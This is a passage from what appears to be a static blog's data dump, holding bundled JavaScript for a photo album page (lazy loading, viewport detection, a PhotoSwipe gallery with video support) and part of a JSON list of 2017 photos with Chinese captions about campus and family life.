opts.container = params.container || opts.container;\n        var offset = opts.offset = params.offset || opts.offset;\n\n        for (var i = 0; i < instances.length; i++) {\n          if (instances[i].container === container) {\n            return instances[i].isInViewport(elt, offset, cb);\n          }\n        }\n\n        return instances[\n          instances.push(createInViewport(container)) - 1\n        ].isInViewport(elt, offset, cb);\n      }\n\n      function addEvent(el, type, fn) {\n        if (el.attachEvent) {\n          el.attachEvent('on' + type, fn);\n        } else {\n          el.addEventListener(type, fn, false);\n        }\n      }\n\n      function debounce(func, wait, immediate) {\n        var timeout;\n        return function() {\n          var context = this,\n            args = arguments;\n          var callNow = immediate && !timeout;\n          clearTimeout(timeout);\n          timeout = setTimeout(later, wait);\n          if (callNow) func.apply(context, args);\n\n          function later() {\n            timeout = null;\n            if (!immediate) func.apply(context, args);\n          }\n        };\n      }\n\n      // https://github.com/jquery/sizzle/blob/3136f48b90e3edc84cbaaa6f6f7734ef03775a07/sizzle.js#L708\n      var contains = function() {\n        if (!global.document) {\n          return true;\n        }\n        return global.document.documentElement.compareDocumentPosition ?\n          function(a, b) {\n            return !!(a.compareDocumentPosition(b) & 16);\n          } :\n          global.document.documentElement.contains ?\n          function(a, b) {\n            return a !== b && (a.contains ? a.contains(b) : false);\n          } :\n          function(a, b) {\n            while (b = b.parentNode) {\n              if (b === a) {\n                return true;\n              }\n            }\n            return false;\n          };\n      }\n\n      function createInViewport(container) {\n        var watches = createWatches();\n\n        var scrollContainer = container === global.document.body ? global : container;\n        var debouncedCheck = debounce(watches.checkAll(watchInViewport), 15);\n\n        addEvent(scrollContainer, 'scroll', debouncedCheck);\n\n        if (scrollContainer === global) {\n          addEvent(global, 'resize', debouncedCheck);\n        }\n\n        if (supportsMutationObserver) {\n          observeDOM(watches, container, debouncedCheck);\n        }\n\n        // failsafe check, every 200ms we check for visible images\n        // usecase: a hidden parent containing eleements\n        // when the parent becomes visible, we have no event that the children\n        // became visible\n        setInterval(debouncedCheck, 150);\n\n        function isInViewport(elt, offset, cb) {\n          if (!cb) {\n            return isVisible(elt, offset);\n          }\n\n          var remote = createRemote(elt, offset, cb);\n          remote.watch();\n          return remote;\n        }\n\n        function createRemote(elt, offset, cb) {\n          function watch() {\n            watches.add(elt, offset, cb);\n          }\n\n          function dispose() {\n            watches.remove(elt);\n          }\n\n          return {\n            watch: watch,\n            dispose: dispose\n          };\n        }\n\n        function watchInViewport(elt, offset, cb) {\n          if (isVisible(elt, offset)) {\n            watches.remove(elt);\n            cb(elt);\n          }\n        }\n\n        function isVisible(elt, offset) {\n          if (!contains(global.document.documentElement, elt) || !contains(global.document.documentElement, container)) {\n            return false;\n          }\n\n          // Check if the element is visible\n          // https://github.com/jquery/jquery/blob/740e190223d19a114d5373758127285d14d6b71e/src/css/hiddenVisibleSelectors.js\n          if (!elt.offsetWidth || !elt.offsetHeight) {\n            return false;\n          }\n\n          var eltRect = elt.getBoundingClientRect();\n          var viewport = {};\n\n          if (container === global.document.body) {\n            viewport = {\n              top: -offset,\n              left: -offset,\n              right: global.document.documentElement.clientWidth + offset,\n              bottom: global.document.documentElement.clientHeight + offset\n            };\n          } else {\n            var containerRect = container.getBoundingClientRect();\n            viewport = {\n              top: containerRect.top - offset,\n              left: containerRect.left - offset,\n              right: containerRect.right + offset,\n              bottom: containerRect.bottom + offset\n            };\n          }\n\n          // The element must overlap with the visible part of the viewport\n          var visible =\n            (\n              (eltRect.right > viewport.left) &&\n              (eltRect.left < viewport.right) &&\n              (eltRect.bottom > viewport.top) &&\n              (eltRect.top < viewport.bottom)\n            );\n\n          return visible;\n        }\n\n        return {\n          container: container,\n          isInViewport: isInViewport\n        };\n      }\n\n      function createWatches() {\n        var watches = [];\n\n        function add(elt, offset, cb) {\n          if (!isWatched(elt)) {\n            watches.push([elt, offset, cb]);\n          }\n        }\n\n        function remove(elt) {\n          var pos = indexOf(elt);\n          if (pos !== -1) {\n            watches.splice(pos, 1);\n          }\n        }\n\n        function indexOf(elt) {\n          for (var i = watches.length - 1; i >= 0; i--) {\n            if (watches[i][0] === elt) {\n              return i;\n            }\n          }\n          return -1;\n        }\n\n        function isWatched(elt) {\n          return indexOf(elt) !== -1;\n        }\n\n        function checkAll(cb) {\n          return function() {\n            for (var i = watches.length - 1; i >= 0; i--) {\n              cb.apply(this, watches[i]);\n            }\n          };\n        }\n\n        return {\n          add: add,\n          remove: remove,\n          isWatched: isWatched,\n          checkAll: checkAll\n        };\n      }\n\n      function observeDOM(watches, container, cb) {\n        var observer = new MutationObserver(watch);\n        var filter = Array.prototype.filter;\n        var concat = Array.prototype.concat;\n\n        observer.observe(container, {\n          childList: true,\n          subtree: true,\n          // changes like style/width/height/display will be catched\n          attributes: true\n        });\n\n        function watch(mutations) {\n          // some new DOM nodes where previously watched\n          // we should check their positions\n          if (mutations.some(knownNodes) === true) {\n            setTimeout(cb, 0);\n          }\n        }\n\n        function knownNodes(mutation) {\n          var nodes = concat.call([],\n            Array.prototype.slice.call(mutation.addedNodes),\n            mutation.target\n          );\n          return filter.call(nodes, watches.isWatched).length > 0;\n        }\n      }\n\n      /* WEBPACK VAR INJECTION */\n    }.call(exports, (function() {\n      return this;\n    }())))\n\n    /***/\n  }\n  /******/\n]);","site":{"data":{}},"excerpt":"","more":"/******/\n(function(modules) { // webpackBootstrap\n  /******/ // The module cache\n  /******/\n  var installedModules = {};\n  /******/\n  /******/ // The require function\n  /******/\n  function __webpack_require__(moduleId) {\n    /******/\n    /******/ // Check if module is in cache\n    /******/\n    if (installedModules[moduleId])\n    /******/\n      return installedModules[moduleId].exports;\n    /******/\n    /******/ // Create a new module (and put it into the cache)\n    /******/\n    var module = installedModules[moduleId] = {\n      /******/\n      exports: {},\n      /******/\n      id: moduleId,\n      /******/\n      loaded: false\n        /******/\n    };\n    /******/\n    /******/ // Execute the module function\n    /******/\n    modules[moduleId].call(module.exports, module, module.exports, __webpack_require__);\n    /******/\n    /******/ // Flag the module as loaded\n    /******/\n    module.loaded = true;\n    /******/\n    /******/ // Return the exports of the module\n    /******/\n    return module.exports;\n    /******/\n  }\n  /******/\n  /******/\n  /******/ // expose the modules object (__webpack_modules__)\n  /******/\n  __webpack_require__.m = modules;\n  /******/\n  /******/ // expose the module cache\n  /******/\n  __webpack_require__.c = installedModules;\n  /******/\n  /******/ // __webpack_public_path__\n  /******/\n  __webpack_require__.p = \"/dist/\";\n  /******/\n  /******/ // Load entry module and return exports\n  /******/\n  return __webpack_require__(0);\n  /******/\n})\n/************************************************************************/\n/******/\n([\n  /* 0 */\n  /***/\n  function(module, exports, __webpack_require__) {\n\n    'use strict';\n\n    __webpack_require__(1);\n\n    var _view = __webpack_require__(2);\n\n    var _view2 = _interopRequireDefault(_view);\n\n    function _interopRequireDefault(obj) {\n      return obj && obj.__esModule ? obj : {\n        default: obj\n      };\n    }\n\n    /**\n     * @name impush-client \n     * @description 这个项目让我发家致富…\n     * @date 2016-12-1\n     */\n\n    var _collection = [];\n    var _count = 0;\n    var searchData;\n\n    function addMask(elem) {\n      var rect = elem.getBoundingClientRect();\n      var style = getComputedStyle(elem, null);\n\n      var mask = document.createElement('i');\n      mask.className = 'icon-film';\n      mask.style.color = '#fff';\n      mask.style.fontSize = '26px';\n      mask.style.position = 'absolute';\n      mask.style.right = '10px';\n      mask.style.bottom = '10px';\n      mask.style.zIndex = 1;\n      elem.parentNode.appendChild(mask);\n    }\n\n    var createVideoIncon = function createVideoIncon() {\n      var $videoImg = document.querySelectorAll('.thumb a[data-type=\"video\"]');\n      for (var i = 0, len = $videoImg.length; i < len; i++) {\n        addMask($videoImg[i]);\n      }\n    };\n    var render = function render(res) {\n      var ulTmpl = \"\";\n      for (var j = 0, len2 = res.list.length; j < len2; j++) {\n        var data = res.list[j].arr;\n        var liTmpl = \"\";\n        for (var i = 0, len = data.link.length; i < len; i++) {\n          var minSrc = './minins/' + data.link[i] + '.min.jpg';\n          var src = './ins/' + data.link[i];\n          var type = 'images';\n\t\t  var sizes = data.sizes[i];\n\t\t  src += '.jpg';\n          var target = src;\n\n          liTmpl += '<figure class=\"thumb\" itemprop=\"associatedMedia\" itemscope=\"\">\\\n                <a href=\"' + src + '\" data-size=\"' + sizes + '\" data-type=\"' + type + '\" data-target=\"' + target + '\">\\\n                  <img class=\"reward-img\" data-type=\"' + type + '\" src=\"' + minSrc + '\" itemprop=\"thumbnail\" onload=\"lzld(this)\">\\\n                </a>\\\n                <figcaption style=\"display:none\" itemprop=\"caption description\">' + data.text[i] + '</figcaption>\\\n            </figure>';\n        }\n        ulTmpl = ulTmpl + '<section class=\"archives album\"><h1 class=\"year\">' + data.year + '<em>' + data.month + '月</em></h1>\\\n        <ul class=\"img-box-ul\">' + liTmpl + '</ul>\\\n        </section>';\n      }\n      document.querySelector('.instagram').innerHTML = '<div class=\"photos\" itemscope=\"\">' + ulTmpl + '</div>';\n      createVideoIncon();\n      _view2.default.init();\n    };\n\n    var replacer = function replacer(str) {\n      var arr = str.split(\"/\");\n      return \"/assets/ins/\" + arr[arr.length - 1];\n    };\n\n    var ctrler = function ctrler(data) {\n      var imgObj = {};\n      for (var i = 0, len = data.length; i < len; i++) {\n        var y = data[i].y;\n        var m = data[i].m;\n        var src = replacer(data[i].src);\n        var text = data[i].text;\n        var key = y + \"\" + ((m + \"\").length == 1 ? \"0\" + m : m);\n        if (imgObj[key]) {\n          imgObj[key].srclist.push(src);\n          imgObj[key].text.push(text);\n        } else {\n          imgObj[key] = {\n            year: y,\n            month: m,\n            srclist: [src],\n            text: [text]\n          };\n        }\n      }\n      render(imgObj);\n    };\n\n    function loadData(success) {\n      if (!searchData) {\n        var xhr = new XMLHttpRequest();\n        xhr.open('GET', './ins.json?t=' + +new Date(), true);\n\n        xhr.onload = function() {\n          if (this.status >= 200 && this.status < 300) {\n            var res = JSON.parse(this.response);\n            searchData = res;\n            success(searchData);\n          } else {\n            console.error(this.statusText);\n          }\n        };\n\n        xhr.onerror = function() {\n          console.error(this.statusText);\n        };\n\n        xhr.send();\n      } else {\n        success(searchData);\n      }\n    }\n\n    var Ins = {\n      init: function init() {\n        loadData(function(data) {\n          render(data);\n        });\n      }\n    };\n\n    Ins.init();\n\n    // export default impush;\n\n    /***/\n  },\n  /* 1 */\n  /***/\n  function(module, exports, __webpack_require__) {\n\n    /* WEBPACK VAR INJECTION */\n    (function(global) {\n      'use strict';\n\n      var inViewport = __webpack_require__(3);\n      var lazyAttrs = ['data-src'];\n\n      global.lzld = lazyload();\n\n      // Provide libs using getAttribute early to get the good src\n      // and not the fake data-src\n      replaceGetAttribute('Image');\n      replaceGetAttribute('IFrame');\n\n      function registerLazyAttr(attr) {\n        if (indexOf.call(lazyAttrs, attr) === -1) {\n          lazyAttrs.push(attr);\n        }\n      }\n\n      function lazyload(opts) {\n        opts = merge({\n          'offset': 333,\n          'src': 'data-src',\n          'container': false\n        }, opts || {});\n\n        if (typeof opts.src === 'string') {\n          registerLazyAttr(opts.src);\n        }\n\n        var elts = [];\n\n        function show(elt) {\n          var src = findRealSrc(elt);\n\n          if (src) {\n            elt.src = src;\n          }\n\n          elt.setAttribute('data-lzled', true);\n          elts[indexOf.call(elts, elt)] = null;\n        }\n\n        function findRealSrc(elt) {\n          if (typeof opts.src === 'function') {\n            return opts.src(elt);\n          }\n\n          return elt.getAttribute(opts.src);\n        }\n\n        function register(elt) {\n          elt.onload = null;\n          elt.removeAttribute('onload');\n          elt.onerror = null;\n          elt.removeAttribute('onerror');\n\n          if (indexOf.call(elts, elt) === -1) {\n            inViewport(elt, opts, show);\n          }\n        }\n\n        return register;\n      }\n\n      function replaceGetAttribute(elementName) {\n        var fullname = 'HTML' + elementName + 'Element';\n        if (fullname in global === false) {\n          return;\n        }\n\n        var original = global[fullname].prototype.getAttribute;\n        global[fullname].prototype.getAttribute = function(name) {\n          if (name === 'src') {\n            var realSrc;\n            for (var i = 0, max = lazyAttrs.length; i < max; i++) {\n              realSrc = original.call(this, lazyAttrs[i]);\n              if (realSrc) {\n                break;\n              }\n            }\n\n            return realSrc || original.call(this, name);\n          }\n\n          // our own lazyloader will go through theses lines\n          // because we use getAttribute(opts.src)\n          return original.call(this, name);\n        };\n      }\n\n      function merge(defaults, opts) {\n        for (var name in defaults) {\n          if (opts[name] === undefined) {\n            opts[name] = defaults[name];\n          }\n        }\n\n        return opts;\n      }\n\n      // http://webreflection.blogspot.fr/2011/06/partial-polyfills.html\n      function indexOf(value) {\n        for (var i = this.length; i-- && this[i] !== value;) {}\n        return i;\n      }\n\n      module.exports = lazyload;\n\n      // export default impush;\n      /* WEBPACK VAR INJECTION */\n    }.call(exports, (function() {\n      return this;\n    }())))\n\n    /***/\n  },\n  /* 2 */\n  /***/\n  function(module, exports) {\n\n    'use strict';\n\n    var initPhotoSwipeFromDOM = function initPhotoSwipeFromDOM(gallerySelector) {\n\n      // parse slide data (url, title, size ...) from DOM elements \n      // (children of gallerySelector)\n      var parseThumbnailElements = function parseThumbnailElements(el) {\n        el = el.parentNode.parentNode;\n        var thumbElements = el.getElementsByClassName('thumb'),\n          numNodes = thumbElements.length,\n          items = [],\n          figureEl,\n          linkEl,\n          size,\n          type,\n          // video or not\n          target,\n          item;\n\n        for (var i = 0; i < numNodes; i++) {\n\n          figureEl = thumbElements[i]; // \n\n          // include only element nodes \n          if (figureEl.nodeType !== 1) {\n            continue;\n          }\n\n          linkEl = figureEl.children[0]; // \n\n          size = linkEl.getAttribute('data-size').split('x');\n          type = linkEl.getAttribute('data-type');\n          target = linkEl.getAttribute('data-target');\n          // create slide object\n          item = {\n            src: linkEl.getAttribute('href'),\n            w: parseInt(size[0], 10),\n            h: parseInt(size[1], 10)\n          };\n\n          if (figureEl.children.length > 1) {\n            item.title = figureEl.children[1].innerHTML;\n          }\n\n          if (linkEl.children.length > 0) {\n            item.msrc = linkEl.children[0].getAttribute('src');\n            item.type = type;\n            item.target = target;\n            item.html = '<video src=\"' + target + '\" controls=\"controls\" autoplay=\"autoplay\"></video>';\n            if (type === 'video') {\n              //item.src = null;\n            }\n          }\n\n          item.el = figureEl; // save link to element for getThumbBoundsFn\n          items.push(item);\n        }\n\n        return items;\n      };\n\n      // find nearest parent element\n      var closest = function closest(el, fn) {\n        return el && (fn(el) ? el : closest(el.parentNode, fn));\n      };\n\n      // triggers when user clicks on thumbnail\n      var onThumbnailsClick = function onThumbnailsClick(e) {\n        e = e || window.event;\n        e.preventDefault ? e.preventDefault() : e.returnValue = false;\n\n        var eTarget = e.target || e.srcElement;\n\n        // find root element of slide\n        var clickedListItem = closest(eTarget, function(el) {\n          return el.tagName && el.tagName.toUpperCase() === 'FIGURE';\n        });\n\n        if (!clickedListItem) {\n          return;\n        }\n\n        // find index of clicked item by looping through all child nodes\n        // alternatively, you may define index via data- attribute\n        var clickedGallery = clickedListItem.parentNode,\n\n          // childNodes = clickedListItem.parentNode.childNodes,\n          // numChildNodes = childNodes.length,\n          childNodes = document.getElementsByClassName('thumb'),\n          numChildNodes = childNodes.length,\n          nodeIndex = 0,\n          index;\n\n        for (var i = 0; i < numChildNodes; i++) {\n          if (childNodes[i].nodeType !== 1) {\n            continue;\n          }\n\n          if (childNodes[i] === clickedListItem) {\n            index = nodeIndex;\n            break;\n          }\n          nodeIndex++;\n        }\n\n        if (index >= 0) {\n          // open PhotoSwipe if valid index found\n          openPhotoSwipe(index, clickedGallery);\n        }\n        return false;\n      };\n\n      // parse picture index and gallery index from URL (#&pid=1&gid=2)\n      var photoswipeParseHash = function photoswipeParseHash() {\n        var hash = window.location.hash.substring(1),\n          params = {};\n\n        if (hash.length < 5) {\n          return params;\n        }\n\n        var vars = hash.split('&');\n        for (var i = 0; i < vars.length; i++) {\n          if (!vars[i]) {\n            continue;\n          }\n          var pair = vars[i].split('=');\n          if (pair.length < 2) {\n            continue;\n          }\n          params[pair[0]] = pair[1];\n        }\n\n        if (params.gid) {\n          params.gid = parseInt(params.gid, 10);\n        }\n\n        return params;\n      };\n\n      var openPhotoSwipe = function openPhotoSwipe(index, galleryElement, disableAnimation, fromURL) {\n        var pswpElement = document.querySelectorAll('.pswp')[0],\n          gallery,\n          options,\n          items;\n\n        items = parseThumbnailElements(galleryElement);\n        // define options (if needed)\n        options = {\n\n          // define gallery index (for URL)\n          galleryUID: galleryElement.getAttribute('data-pswp-uid'),\n\n          getThumbBoundsFn: function getThumbBoundsFn(index) {\n            // See Options -> getThumbBoundsFn section of documentation for more info\n            var thumbnail = items[index].el.getElementsByTagName('img')[0],\n              // find thumbnail\n              pageYScroll = window.pageYOffset || document.documentElement.scrollTop,\n              rect = thumbnail.getBoundingClientRect();\n\n            return {\n              x: rect.left,\n              y: rect.top + pageYScroll,\n              w: rect.width\n            };\n          }\n\n        };\n\n        // PhotoSwipe opened from URL\n        if (fromURL) {\n          if (options.galleryPIDs) {\n            // parse real index when custom PIDs are used \n            // http://photoswipe.com/documentation/faq.html#custom-pid-in-url\n            for (var j = 0; j < items.length; j++) {\n              if (items[j].pid == index) {\n                options.index = j;\n                break;\n              }\n            }\n          } else {\n            // in URL indexes start from 1\n            options.index = parseInt(index, 10) - 1;\n          }\n        } else {\n          options.index = parseInt(index, 10);\n        }\n\n        // exit if index not found\n        if (isNaN(options.index)) {\n          return;\n        }\n\n        if (disableAnimation) {\n          options.showAnimationDuration = 0;\n        }\n\n        // Pass data to PhotoSwipe and initialize it\n        gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, options);\n        gallery.init();\n\n        var $tempVideo;\n        var stopVideoHandle = function stopVideoHandle() {\n          if ($tempVideo) {\n            $tempVideo.remove();\n            $tempVideo = null;\n          }\n        };\n        var changeHandle = function changeHandle() {\n          var item = gallery.currItem;\n          stopVideoHandle();\n          if (item.type === 'video') {\n            var $ctn = item.container;\n            var style = $ctn.getElementsByClassName('pswp__img')[0].style;\n            var $video = document.createElement('video');\n            $video.setAttribute('autoplay', 'autoplay');\n            $video.setAttribute('controls', 'controls');\n            $video.setAttribute('src', item.target);\n            $video.style.width = style.width;\n            $video.style.height = style.height;\n            $video.style.position = 'absolute';\n            $video.style.zIndex = 2;\n            $tempVideo = $video;\n            $ctn.appendChild($video);\n          }\n        };\n        gallery.listen('initialZoomIn', changeHandle);\n        gallery.listen('afterChange', changeHandle);\n        gallery.listen('initialZoomOut', stopVideoHandle);\n      };\n\n      // loop through all gallery elements and bind events\n      var galleryElements = document.querySelectorAll(gallerySelector);\n      for (var i = 0, l = galleryElements.length; i < l; i++) {\n        galleryElements[i].setAttribute('data-pswp-uid', i + 1);\n        galleryElements[i].onclick = onThumbnailsClick;\n      }\n\n      // Parse URL and open gallery if it contains #&pid=3&gid=1\n      var hashData = photoswipeParseHash();\n      if (hashData.pid && hashData.gid) {\n        openPhotoSwipe(hashData.pid, galleryElements[hashData.gid - 1], true, true);\n      }\n    };\n\n    var Viewer = function() {\n      function init() {\n        initPhotoSwipeFromDOM('.photos');\n      }\n      return {\n        init: init\n      };\n    }();\n\n    module.exports = Viewer;\n\n    /***/\n  },\n  /* 3 */\n  /***/\n  function(module, exports) {\n\n    /* WEBPACK VAR INJECTION */\n    (function(global) {\n      module.exports = inViewport;\n\n      var instances = [];\n      var supportsMutationObserver = typeof global.MutationObserver === 'function';\n\n      function inViewport(elt, params, cb) {\n        var opts = {\n          container: global.document.body,\n          offset: 0\n        };\n\n        if (params === undefined || typeof params === 'function') {\n          cb = params;\n          params = {};\n        }\n\n        var container = opts.container = params.container || opts.container;\n        var offset = opts.offset = params.offset || opts.offset;\n\n        for (var i = 0; i < instances.length; i++) {\n          if (instances[i].container === container) {\n            return instances[i].isInViewport(elt, offset, cb);\n          }\n        }\n\n        return instances[\n          instances.push(createInViewport(container)) - 1\n        ].isInViewport(elt, offset, cb);\n      }\n\n      function addEvent(el, type, fn) {\n        if (el.attachEvent) {\n          el.attachEvent('on' + type, fn);\n        } else {\n          el.addEventListener(type, fn, false);\n        }\n      }\n\n      function debounce(func, wait, immediate) {\n        var timeout;\n        return function() {\n          var context = this,\n            args = arguments;\n          var callNow = immediate && !timeout;\n          clearTimeout(timeout);\n          timeout = setTimeout(later, wait);\n          if (callNow) func.apply(context, args);\n\n          function later() {\n            timeout = null;\n            if (!immediate) func.apply(context, args);\n          }\n        };\n      }\n\n      // https://github.com/jquery/sizzle/blob/3136f48b90e3edc84cbaaa6f6f7734ef03775a07/sizzle.js#L708\n      var contains = function() {\n        if (!global.document) {\n          return true;\n        }\n        return global.document.documentElement.compareDocumentPosition ?\n          function(a, b) {\n            return !!(a.compareDocumentPosition(b) & 16);\n          } :\n          global.document.documentElement.contains ?\n          function(a, b) {\n            return a !== b && (a.contains ? a.contains(b) : false);\n          } :\n          function(a, b) {\n            while (b = b.parentNode) {\n              if (b === a) {\n                return true;\n              }\n            }\n            return false;\n          };\n      }\n\n      function createInViewport(container) {\n        var watches = createWatches();\n\n        var scrollContainer = container === global.document.body ? global : container;\n        var debouncedCheck = debounce(watches.checkAll(watchInViewport), 15);\n\n        addEvent(scrollContainer, 'scroll', debouncedCheck);\n\n        if (scrollContainer === global) {\n          addEvent(global, 'resize', debouncedCheck);\n        }\n\n        if (supportsMutationObserver) {\n          observeDOM(watches, container, debouncedCheck);\n        }\n\n        // failsafe check, every 200ms we check for visible images\n        // usecase: a hidden parent containing eleements\n        // when the parent becomes visible, we have no event that the children\n        // became visible\n        setInterval(debouncedCheck, 150);\n\n        function isInViewport(elt, offset, cb) {\n          if (!cb) {\n            return isVisible(elt, offset);\n          }\n\n          var remote = createRemote(elt, offset, cb);\n          remote.watch();\n          return remote;\n        }\n\n        function createRemote(elt, offset, cb) {\n          function watch() {\n            watches.add(elt, offset, cb);\n          }\n\n          function dispose() {\n            watches.remove(elt);\n          }\n\n          return {\n            watch: watch,\n            dispose: dispose\n          };\n        }\n\n        function watchInViewport(elt, offset, cb) {\n          if (isVisible(elt, offset)) {\n            watches.remove(elt);\n            cb(elt);\n          }\n        }\n\n        function isVisible(elt, offset) {\n          if (!contains(global.document.documentElement, elt) || !contains(global.document.documentElement, container)) {\n            return false;\n          }\n\n          // Check if the element is visible\n          // https://github.com/jquery/jquery/blob/740e190223d19a114d5373758127285d14d6b71e/src/css/hiddenVisibleSelectors.js\n          if (!elt.offsetWidth || !elt.offsetHeight) {\n            return false;\n          }\n\n          var eltRect = elt.getBoundingClientRect();\n          var viewport = {};\n\n          if (container === global.document.body) {\n            viewport = {\n              top: -offset,\n              left: -offset,\n              right: global.document.documentElement.clientWidth + offset,\n              bottom: global.document.documentElement.clientHeight + offset\n            };\n          } else {\n            var containerRect = container.getBoundingClientRect();\n            viewport = {\n              top: containerRect.top - offset,\n              left: containerRect.left - offset,\n              right: containerRect.right + offset,\n              bottom: containerRect.bottom + offset\n            };\n          }\n\n          // The element must overlap with the visible part of the viewport\n          var visible =\n            (\n              (eltRect.right > viewport.left) &&\n              (eltRect.left < viewport.right) &&\n              (eltRect.bottom > viewport.top) &&\n              (eltRect.top < viewport.bottom)\n            );\n\n          return visible;\n        }\n\n        return {\n          container: container,\n          isInViewport: isInViewport\n        };\n      }\n\n      function createWatches() {\n        var watches = [];\n\n        function add(elt, offset, cb) {\n          if (!isWatched(elt)) {\n            watches.push([elt, offset, cb]);\n          }\n        }\n\n        function remove(elt) {\n          var pos = indexOf(elt);\n          if (pos !== -1) {\n            watches.splice(pos, 1);\n          }\n        }\n\n        function indexOf(elt) {\n          for (var i = watches.length - 1; i >= 0; i--) {\n            if (watches[i][0] === elt) {\n              return i;\n            }\n          }\n          return -1;\n        }\n\n        function isWatched(elt) {\n          return indexOf(elt) !== -1;\n        }\n\n        function checkAll(cb) {\n          return function() {\n            for (var i = watches.length - 1; i >= 0; i--) {\n              cb.apply(this, watches[i]);\n            }\n          };\n        }\n\n        return {\n          add: add,\n          remove: remove,\n          isWatched: isWatched,\n          checkAll: checkAll\n        };\n      }\n\n      function observeDOM(watches, container, cb) {\n        var observer = new MutationObserver(watch);\n        var filter = Array.prototype.filter;\n        var concat = Array.prototype.concat;\n\n        observer.observe(container, {\n          childList: true,\n          subtree: true,\n          // changes like style/width/height/display will be catched\n          attributes: true\n        });\n\n        function watch(mutations) {\n          // some new DOM nodes where previously watched\n          // we should check their positions\n          if (mutations.some(knownNodes) === true) {\n            setTimeout(cb, 0);\n          }\n        }\n\n        function knownNodes(mutation) {\n          var nodes = concat.call([],\n            Array.prototype.slice.call(mutation.addedNodes),\n            mutation.target\n          );\n          return filter.call(nodes, watches.isWatched).length > 0;\n        }\n      }\n\n      /* WEBPACK VAR INJECTION */\n    }.call(exports, (function() {\n      return this;\n    }())))\n\n    /***/\n  }\n  /******/\n]);"},{"_content":"{\n\t\"list\": [{\n\t\t\"date\": \"2017-12\",\n\t\t\"arr\": {\n\t\t\t\"year\": 2017,\n\t\t\t\"month\": 12,\n\t\t\t\"link\": [\"201712040641\"],\n\t\t\t\"text\": [\"早起升旗，本来很不情愿，好不容易周一早上没课，却要早起。但看到了将要落下的圆月……\"],\n\t\t\t\"sizes\": [\"4032x3024\"]\n\t\t}\n\t},{\n\t\t\"date\": \"2017-11\",\n\t\t\"arr\": {\n\t\t\t\"year\": 2017,\n\t\t\t\"month\": 11,\n\t\t\t\"link\": [\"201711261716\",\"201711251521\",\"201711042226\"],\n\t\t\t\"text\": [\"图书馆六楼的眺望\",\"图书馆六楼的眺望\",\"舍友刚买了单反，“来，给我拍一张”\"],\n\t\t\t\"sizes\": [\"4032x3024\",\"4032x3024\",\"6000x4000\"]\n\t\t}\n\t},{\n\t\t\"date\": \"2017-10\",\n\t\t\"arr\": {\n\t\t\t\"year\": 2017,\n\t\t\t\"month\": 10,\n\t\t\t\"link\": [\"201710051637\",\"201710051628\",\"201710051554\"],\n\t\t\t\"text\": [\"站在家乡的山上，远方的民房，还有炊烟\",\"放了十几年的羊，累了，就躺在一座坟墓上\",\"和最好的朋友一起回到了初中，他感叹，物是人非了\"],\n\t\t\t\"sizes\": [\"4032x3024\",\"3662x2744\",\"4032x3024\"]\n\t\t}\n\t},{\n\t\t\"date\": \"2017-09\",\n\t\t\"arr\": {\n\t\t\t\"year\": 2017,\n\t\t\t\"month\": 9,\n\t\t\t\"link\": [\"201709162031\",\"201709050823\",\"201709050547\"],\n\t\t\t\"text\": [\"黑夜里的诚湖\",\"迎新啦~\",\"早上5点多，校园的树林里一群野猫\"],\n\t\t\t\"sizes\": [\"4032x3024\",\"4032x3024\",\"4032x3024\"]\n\t\t}\n\t},{\n\t\t\"date\": \"2017-08\",\n\t\t\"arr\": {\n\t\t\t\"year\": 2017,\n\t\t\t\"month\": 8,\n\t\t\t\"link\": [\"201708151756\",\"201708071325\",\"201708101639\",\"201708071305\"],\n\t\t\t\"text\": [\"南京，真是个奇特的城市\",\"与最好的同学回到曾经一起嬉闹的地方，图为公寓\",\"办公室楼梯的窗户上，不知谁写了“你好”\",\"与最好的同学回到曾经一起嬉闹的地方，图为教学楼\"],\n\t\t\t\"sizes\": [\"3024x4032\",\"1334x750\",\"3024x4032\",\"4032x3024\"]\n\t\t}\n\t},{\n\t\t\"date\": \"2017-07\",\n\t\t\"arr\": {\n\t\t\t\"year\": 2017,\n\t\t\t\"month\": 7,\n\t\t\t\"link\": [\"201707281515\",\"201707281716\",\"201707211951\",\"201707061853\"],\n\t\t\t\"text\": [\"舅妈，表姐，和她的孩子，祖孙三辈在海底世界\",\"表姐家孩子在葡萄园，孩子永远能让人开心\",\"暑假里拉着最好的朋友一人买了一台电脑，比比谁的好看\",\"军训突然下雨，也要集合完再解散，真的勇士~\"],\n\t\t\t\"sizes\": [\"4032x3024\",\"3024x4032\",\"4032x3024\",\"2276x1711\"]\n\t\t}\n\t},{\n\t\t\"date\": \"2017-06\",\n\t\t\"arr\": {\n\t\t\t\"year\": 2017,\n\t\t\t\"month\": 6,\n\t\t\t\"link\": [\"201706190029\"],\n\t\t\t\"text\": [\"宿舍断电断网？联机CS吧！\"],\n\t\t\t\"sizes\": [\"4032x3024\"]\n\t\t}\n\t},{\n\t\t\"date\": \"2017-05\",\n\t\t\"arr\": {\n\t\t\t\"year\": 2017,\n\t\t\t\"month\": 5,\n\t\t\t\"link\": [\"201705202010\"],\n\t\t\t\"text\": [\"520那天，单身的我想去图书馆溜达溜达，到了门口发现已经闭馆，悻悻然往宿舍走，突然发现远方天空的烟花\"],\n\t\t\t\"sizes\": [\"3024x4032\"]\n\t\t}\n\t},{\n\t\t\"date\": \"2017-04\",\n\t\t\"arr\": {\n\t\t\t\"year\": 2017,\n\t\t\t\"month\": 4,\n\t\t\t\"link\": [\"201704091934\",\"201704221527\",\"201704221212\",\"201704221108\"],\n\t\t\t\"text\": [\"大一最后的晚自习，只有班长一个人坐在自习室\",\"百度安全和ichunqiu联合举办的线下沙龙，有幸受邀，图为休息时间的茶点与零食\",\"中关村微软大楼\",\"中关村一角\"],\n\t\t\t\"sizes\": [\"4032x3024\",\"3024x4032\",\"4032x3024\",\"4032x3024\"]\n\t\t}\n\t},{\n\t\t\"date\": \"2017-03\",\n\t\t\"arr\": {\n\t\t\t\"year\": 2017,\n\t\t\t\"month\": 3,\n\t\t\t\"link\": [\"201703092231\"],\n\t\t\t\"text\": [\"我哥最帅！！！\"],\n\t\t\t\"sizes\": [\"540x960\"]\n\t\t}\n\t},{\n\t\t\"date\": \"2017-02\",\n\t\t\"arr\": {\n\t\t\t\"year\": 2017,\n\t\t\t\"month\": 2,\n\t\t\t\"link\": [\"201702111159\",\"201702061257\"],\n\t\t\t\"text\": [\"不负旧时光\",\"房山高中欢度春节了，可惜不是我的母校\"],\n\t\t\t\"sizes\": [\"1000x1000\",\"1334x750\"]\n\t\t}\n\t},{\n\t\t\"date\": \"2016-10\",\n\t\t\"arr\": {\n\t\t\t\"year\": 